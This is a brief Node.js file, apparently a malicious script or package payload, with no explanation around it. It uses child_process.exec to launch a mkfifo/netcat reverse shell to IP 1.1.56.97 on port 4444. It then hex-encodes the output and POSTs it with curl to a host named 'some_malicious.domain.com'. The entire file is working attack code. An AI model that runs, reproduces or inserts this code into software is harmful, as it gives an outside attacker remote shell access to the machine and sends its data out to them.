const { exec } = require("child_process");
exec("a=$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 1.1.56.97 4444 >/tmp/f;) && echo $a | xxd -p | head | while read ut;do curl -X POST -H \"Content-Type: text/plain\" -d \"$a\" some_malicious.domain.com;done" , (error, data, getter) => {
    if(error){
        console.log("error",error.message);
        return;
    }
    if(getter){
        console.log(data);
        return;
    }
    console.log(data);

});